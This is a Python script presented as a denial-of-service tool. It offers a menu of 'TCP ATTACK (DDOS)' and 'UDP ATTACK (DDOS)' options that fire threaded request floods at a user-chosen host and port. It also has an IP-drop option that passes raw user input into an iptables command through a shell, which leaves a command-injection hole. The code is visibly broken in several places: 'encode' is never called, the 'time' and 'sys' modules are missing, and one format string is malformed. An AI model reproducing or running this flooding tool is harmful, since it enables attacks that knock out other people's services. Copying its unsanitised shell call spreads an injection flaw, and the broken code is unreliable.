import socket, threading, os, subprocess
def sendtcp(host, port):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))
		s.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode)
		s.close()
	except:
		pass
def sendudp(host, port):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		s.sendto(f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode, (host, port))
		s.close()
	except:
		pass
def start(type, host, port, number):
	try:
		size = 0
		for num in range(number):
			t = threading.Thread(target=type, args=(host, port))
			t.start()
			size += len("GET / HTTP/1.1\r\nHost: {host}\r\n\r\n")
			print(f"[ \033[33m{host}:{port}\033[0m | Pack Num: \033[33m{num}\033[0m | All Size: {size}B ]")
	except Exception as e:
		print(f"\033[31m[ Error: {e}\033[31m ]")
def drop(ip):
    command = f"iptables -A INPUT -s {ip} -j DROP"
    subprocess.run(command, shell=True)
def menu():
	os.system("clear")
	print("""\033[33m_    _   _ _  ______ ___  _
| |  | | | | |/ / ___/ _ \/ |
| |  | | | | ' / |  | | | | |
| |__| |_| | . \ |__| |_| | |
|_____\___/|_|\_\____\___/|_|
	\033[0m""")
	print("\033[33m[01]\033[0m TCP ATTACK (DDOS)")
	print("\033[33m[02]\033[0m UDP ATTACK (DDOS)")
	print("\033[33m[03]\033[0m IP DROP (IPTABLES)")
	print("\n\033[33m[99]\033[0m EXIT")
	ch = input("\nChoice: \033[33m")
	if ch == "01":
		try:
			host = input("\n\033[0mHost: \033[33m")
			port = int(input("\033[0mPort: \033[33m"))
			number = int(input("\033[0mPacket Count: \033[33m"))
			start(sendtcp, host, port, number)
		except:
			menu()
	elif ch == "1":
		try:
			host = input("\n\033[0mHost: \033[33m")
			port = int(input("\033[0mPort: \033[33m"))
			number = int(input("\033[0mPacket Count: \033[33m"))
			start(sendtcp, host, port, number)
		except:
			menu()
	elif ch == "02":
		try:
			host = input("\n\033[0mHost: \033[33m")
			port = int(input("\033[0mPort: \033[33m"))
			number = int(input("\033[0mPacket Count: \033[33m"))
			start(sendudp, host, port, number)
		except:
			menu()
	elif ch == "2":
		try:
			host = input("\n\033[0mHost: \033[33m")
			port = int(input("\033[0mPort: \033[33m"))
			number = int(input("\033[0mPacket Count: \033[33m"))
			start(sendudp, host, port, number)
		except:
			menu()
	elif ch == "03":
		try:
			ip = input("\n\033[0mIP Address: \033[33m")
			drop(ip)
			print("Sucessfuly! Target Dropped")
			time.sleep(3)
			menu()
		except:
			menu()
	elif ch == "3":
		try:
			ip = input("\n\033[0mIP Address: \033[33m")
			drop(ip)
			time.sleep(1)
			print("Sucessfuly! Target Dropped")
			time.sleep(3)
			menu()
		except:
			menu()
	elif ch == "99":
		sys.exit()
	else:
		menu()
menu()
